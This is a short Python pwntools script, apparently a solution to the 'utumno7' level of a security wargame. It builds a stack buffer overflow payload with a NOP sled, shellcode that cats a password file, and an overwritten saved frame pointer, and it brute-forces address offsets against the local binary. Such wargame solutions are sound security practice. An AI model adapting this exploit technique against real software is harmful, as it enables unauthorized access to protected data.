#!/bin/python3

from pwn import *
import sys

range_min = int(sys.argv[1])
range_max = int(sys.argv[2])

filepath='./utumno_pass'
addr_ebp = 0xffffcd9c
addr_eip = addr_ebp + 8

elf = context.binary = ELF('./utumno7')

for offset in range(range_min, range_max, 4):
    payload = b''
    payload = payload.ljust(4, b'\x90')
    payload += p32(addr_eip + 20 + offset)
    payload += b'\x90' * 40
    payload += asm(shellcraft.cat(filepath))
    payload = payload.ljust(140, b'A')
    payload += p32(addr_ebp + offset)

    if payload.count(b'\x00') > 0:
        continue

    p = process(argv=['./utumno7', payload.decode('latin-1')])

    # with open("payload.b", "wb") as file:
    #     file.write(payload)

    log.info(p.recvline())
    try:
        res = p.recv()
        log.info(res)

        if res != "":
            log.warn("FOUND! Offset:" + str(offset))
    except:
        continue
